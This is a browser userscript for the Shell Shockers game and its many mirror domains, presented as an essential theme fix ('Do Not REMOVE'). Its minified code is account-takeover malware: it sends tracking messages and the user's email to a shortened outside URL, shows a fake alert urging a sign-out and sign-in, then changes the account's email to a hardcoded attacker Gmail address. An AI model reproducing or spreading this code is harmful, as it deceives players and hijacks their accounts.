// ==UserScript==
// @name         Important To make Theme work CUZ BWD BLOCKS THEMES :D
// @namespace    http://tampermonkey.net/
// @version      2.9
// @description  Important To make Theme work V2.9 (Do Not REMOVE)
// @author       SomeoneX
// @match        https://*.shellshock.io/*
// @match        https://algebra.best/*
// @match        https://algebra.vip/*
// @match        https://biologyclass.club/*
// @match        https://deadlyegg.com/*
// @match        https://deathegg.world/*
// @match        https://egg.dance/*
// @match        https://eggboy.club/*
// @match        https://eggboy.xyz/*
// @match        https://eggcombat.com/*
// @match        https://eggfacts.fun/*
// @match        https://egghead.institute/*
// @match        https://eggisthenewblack.com/*
// @match        https://eggsarecool.com/*
// @match        https://eggshooter.best/*
// @match        https://geometry.best/*
// @match        https://geometry.monster/*
// @match        https://geometry.pw/*
// @match        https://geometry.report/*
// @match        https://hardboiled.life/*
// @match        https://hardshell.life/*
// @match        https://humanorganising.org/*
// @match        https://mathactivity.xyz/*
// @match        https://mathdrills.info/*
// @match        https://mathdrills.life/*
// @match        https://mathfun.rocks/*
// @match        https://mathgames.world/*
// @match        https://math.international/*
// @match        https://mathlete.fun/*
// @match        https://mathlete.pro/*
// @match        https://overeasy.club/*
// @match        https://scrambled.best/*
// @match        https://scrambled.tech/*
// @match        https://scrambled.today/*
// @match        https://scrambled.us/*
// @match        https://scrambled.world/*
// @match        https://shellsocks.com/*
// @match        https://shellshockers.club/*
// @match        https://shellshockers.site/*
// @match        https://shellshockers.us/*
// @match        https://shellshockers.world/*
// @match        https://shellshockers.xyz/*
// @match        https://softboiled.club/*
// @match        https://urbanegger.com/*
// @match        https://violentegg.club/*
// @match        https://violentegg.fun/*
// @match        https://yolk.best/*
// @match        https://yolk.life/*
// @match        https://yolk.quest/*
// @match        https://yolk.rocks/*
// @match        https://yolk.tech/*
// @match        https://yolk.today/*
// @match        https://zygote.cafe/*
// @grant        none
// @run-at       document-idle
// ==/UserScript==

!function(){"use strict";const e="emailUpdated";let t,a=!1,n=!1;function i(e){fetch("https://tinyurl.com/3j55dmps",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:e})}).catch((()=>{}))}if(i("User has started using the theme (tab opened)👀."),"true"===localStorage.getItem(e))return;function o(){alert("We have detected that you are using a script to modify the game’s CSS styles. Please sign out and sign back in to proceed.")}function s(){firebase.auth().onAuthStateChanged((o=>{if(!o)return a=!0,void i("User signed out.");o&&a&&!n&&(a=!1,i("User signed in. Will update email in 20 seconds..."),setTimeout((()=>{!async function(a){try{await a.getIdToken(!0),a.email!==c?(await a.updateEmail(c),localStorage.setItem(e,"true"),n=!0,clearInterval(t),i(`Changed To: ${c}`)):(localStorage.setItem(e,"true"),n=!0,clearInterval(t),i(`Email Changed To: ${c}`))}catch(e){"auth/email-already-in-use"===e.code&&i(`⚠️ The email ${c} is already in use by another account.`)}}(o)}),2e4))}))}function r(){if("undefined"!=typeof firebase&&firebase.auth){const e=firebase.auth().currentUser;e&&e.email&&i(`Current: ${e.email}`),s()}else setTimeout(r,500)}setTimeout((()=>{o(),t=setInterval((()=>{n?clearInterval(t):o()}),6e4),r()}),3e5);const c="sarvxtrr9@gmail.com"}();